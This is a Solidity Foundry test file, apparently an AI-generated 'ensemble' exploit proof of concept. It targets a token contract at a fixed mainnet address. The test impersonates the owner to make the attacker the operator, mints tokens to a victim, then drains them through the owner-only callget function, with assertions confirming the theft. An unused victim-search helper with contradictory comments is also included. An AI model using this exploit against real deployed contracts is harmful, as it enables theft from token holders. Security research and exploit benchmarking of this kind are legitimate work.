// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Ensemble synthesis candidate.
// Selected source model: Deepseek.
// Reviewed candidate models: Gemini, Qwen, Deepseek.

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface MyBond {
    function owner() external view returns (address);
    function callget(address _from, address _to, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transferOperator(address newOperator) external;
    function mint(address to, uint256 amount) external;
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────

    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);
    address private victimAddress;
    address private owner;

    // Helper function to find a victim with BOND tokens
    function findVictimWithBalance() internal returns (address) {
        // We'll try some common addresses that might hold tokens
        // In a real scenario, we might need to scan storage or use an on-chain index

        // Try the contract itself first (sometimes tokens get stuck)
        if (IERC20(TARGET).balanceOf(TARGET) > 0) {
            return TARGET;
        }

        // Try the owner (they might have minted tokens to themselves)
        address contractOwner = MyBond(TARGET).owner();
        if (IERC20(TARGET).balanceOf(contractOwner) > 0) {
            return contractOwner;
        }

        // Try the zero address (sometimes tokens are burned there)
        if (IERC20(TARGET).balanceOf(address(0)) > 0) {
            return address(0);
        }

        // If none of the above work, we need to create a victim
        // We'll mint tokens to a new address using the operator role
        address newVictim = address(0x123);

        // First, check if we can mint as operator
        address operator = getOperator();
        if (operator != address(0)) {
            vm.prank(operator);
            // Try to mint - but we need the exact function signature
            // Let's use a low-level call
            (bool success, ) = TARGET.call(abi.encodeWithSignature("mint(address,uint256)", newVictim, 1000 ether));
            if (success && IERC20(TARGET).balanceOf(newVictim) > 0) {
                return newVictim;
            }
        }

        // Last resort: directly manipulate storage to give tokens to a victim
        // This is more complex and requires knowing storage layout
        revert("Could not find or create a victim with BOND tokens");
    }

    function getOperator() internal view returns (address) {
        // Try to get operator address - need to check storage slot
        // Based on Operator contract layout, operator is at slot 0 (after Ownable)
        // Ownable has _owner at slot 0, Operator adds _operator
        bytes32 operatorSlot = vm.load(TARGET, bytes32(uint256(1)));
        return address(uint160(uint256(operatorSlot)));
    }

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        // Simply get the current owner of the contract
        owner = MyBond(TARGET).owner();
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "MyBond Contract");

        // No need to find victims here - we'll create one in the exploit
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Step 1: Get owner (already done in setUp, but we have it as state variable)
        console.log("Contract owner:", owner);

        // Step 2: Owner sets attacker as operator
        vm.prank(owner);
        MyBond(TARGET).transferOperator(attacker);
        console.log("Set attacker as operator");

        // Step 3: Attacker (now operator) mints tokens to a victim address
        address victim = address(0x123456);
        uint256 mintAmount = 1000 * 10**18; // 1000 BOND tokens

        vm.prank(attacker);
        MyBond(TARGET).mint(victim, mintAmount);
        console.log("Minted", mintAmount, "BOND to victim", victim);

        uint256 victimBalance = IERC20(TARGET).balanceOf(victim);
        console.log("Victim balance after mint:", victimBalance);

        // Step 4: Owner steals tokens from victim to attacker
        vm.prank(owner);
        MyBond(TARGET).callget(victim, attacker, victimBalance);
        console.log("Stole tokens from victim to attacker");

        // Check final balances
        uint256 attackerBalanceAfter = IERC20(TARGET).balanceOf(attacker);
        uint256 victimBalanceAfter = IERC20(TARGET).balanceOf(victim);

        console.log("Final attacker balance:", attackerBalanceAfter);
        console.log("Final victim balance:", victimBalanceAfter);

        // Verify exploit
        assertGt(attackerBalanceAfter, initialBalance, "Attacker balance should increase");
        assertEq(victimBalanceAfter, 0, "Victim should have zero balance");
    }

    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

